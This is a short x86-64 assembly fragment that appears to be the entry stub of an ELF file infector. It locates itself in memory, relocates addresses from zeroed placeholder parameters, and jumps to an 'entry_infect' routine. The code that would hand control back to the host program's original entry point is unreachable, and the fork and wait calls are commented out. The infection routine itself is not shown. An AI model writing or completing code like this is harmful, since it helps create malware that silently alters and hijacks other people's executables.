section.text:
	global _start:function

_start:
	call _inject ; push addr to stack

_inject:
	pop r8
	push rdx
	sub r8, 0x5
	sub r8, [rel offset_inject]
	add r8, [rel vaddr]

;	mov rax, 60; exit
;	mov rdi, 0
;	syscall

;	mov rax, 57; fork
;	syscall
;	cmp rax, 0
;	jz _fork

_wait:
;	mov rax, 61; wait
;	mov rdi, 0x0
;	syscall
;	cmp rax, -1
;	jnz _wait
	jmp _fork

	add r8, [rel entry_prg]

	pop rdx
	jmp r8

_fork:
	add r8, [rel entry_infect]

	pop rdx
	jmp r8

_params:
	vaddr dq 0x0
	offset_inject dq 0x0
	entry_prg dq 0x0
	entry_infect dq 0x0
